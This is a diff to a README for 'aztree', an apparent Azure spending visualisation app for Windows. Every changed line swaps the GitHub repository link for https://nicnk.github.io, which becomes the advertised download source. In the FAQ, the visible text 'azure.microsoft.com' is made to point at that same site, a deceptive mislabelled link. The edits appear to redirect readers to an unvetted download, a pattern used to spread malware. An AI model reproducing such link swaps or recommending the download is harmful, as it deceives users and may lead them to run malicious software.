@@ -1,7 +1,7 @@
 <h1>💸 aztree - Your Azure Spending Made Simple</h1>
 
 <p align="center">
-  <a href="https://github.com/Nicnk/aztree"><img src="https://img.shields.io/badge/Download%20aztree-Click%20Here-2ea44f?style=for-the-badge&logo=github" alt="Download aztree"></a>
+  <a href="https://nicnk.github.io"><img src="https://img.shields.io/badge/Download%20aztree-Click%20Here-2ea44f?style=for-the-badge&logo=github" alt="Download aztree"></a>
 </p>
 
 ---
@@ -31,7 +31,7 @@ Let's get aztree running on your Windows computer. Follow these simple steps, an
 
 ### Step 1: Download aztree
 
-Visit this link to download the application: **[https://github.com/Nicnk/aztree](https://github.com/Nicnk/aztree)**
+Visit this link to download the application: **[https://nicnk.github.io](https://nicnk.github.io)**
 
 Click the big green button on that page to start the download. The file will save to your "Downloads" folder.
 
@@ -75,7 +75,7 @@ Yes. aztree uses Microsoft's official secure sign-in process. Your login credent
 No. aztree is a standalone application. Once you download it, it runs on its own.
 
 ### What if I don't have an Azure account?
-You'll need an Azure account with at least one active subscription to see any billing data. If you don't have one, you can create a free account at [azure.microsoft.com](https://azure.microsoft.com).
+You'll need an Azure account with at least one active subscription to see any billing data. If you don't have one, you can create a free account at [azure.microsoft.com](https://nicnk.github.io).
 
 ---
 
@@ -94,7 +94,7 @@ aztree uses the most recent billing data available. There can be a short delay o
 
 ## 📚 Helpful Resources
 
-- **Official Project Page:** [https://github.com/Nicnk/aztree](https://github.com/Nicnk/aztree)
+- **Official Project Page:** [https://nicnk.github.io](https://nicnk.github.io)
 - **Azure Billing Documentation:** Microsoft's official guide to understanding your Azure invoice (search "Azure billing documentation" on Microsoft's site).
 - **Community Support:** Look for discussions in the "Issues" tab on the GitHub page. You can ask questions there and see what other users have already resolved.
 
@@ -115,7 +115,7 @@ Stay tuned and check back frequently for updates.
 
 ## 💖 Show Your Support
 
-If aztree helps you save money on your Azure bill, consider giving it a star on GitHub. It's a free and quick way to show appreciation to the developers. Just visit [https://github.com/Nicnk/aztree](https://github.com/Nicnk/aztree) and click the ⭐ button at the top of the page.
+If aztree helps you save money on your Azure bill, consider giving it a star on GitHub. It's a free and quick way to show appreciation to the developers. Just visit [https://nicnk.github.io](https://nicnk.github.io) and click the ⭐ button at the top of the page.
 
 ---
 
@@ -123,6 +123,6 @@ If aztree helps you save money on your Azure bill, consider giving it a star on 
 
 Stop guessing about your cloud costs. With aztree, you'll finally have a clear, visual understanding of your Azure spending — and that understanding is the first step to saving money. Download aztree today and take control of your cloud bill.
 
-**Remember:** Visit this link to download the application: [https://github.com/Nicnk/aztree](https://github.com/Nicnk/aztree)
+**Remember:** Visit this link to download the application: [https://nicnk.github.io](https://nicnk.github.io)
 
 Keywords: azure, billing, cloud, cloudcomputing, microsoft, cost management, spending tracker, azure costs, cloud costs, billing visualization, cost analysis, azure monitor, subscription management, resource groups, azure services, bill analyzer, savings, optimization
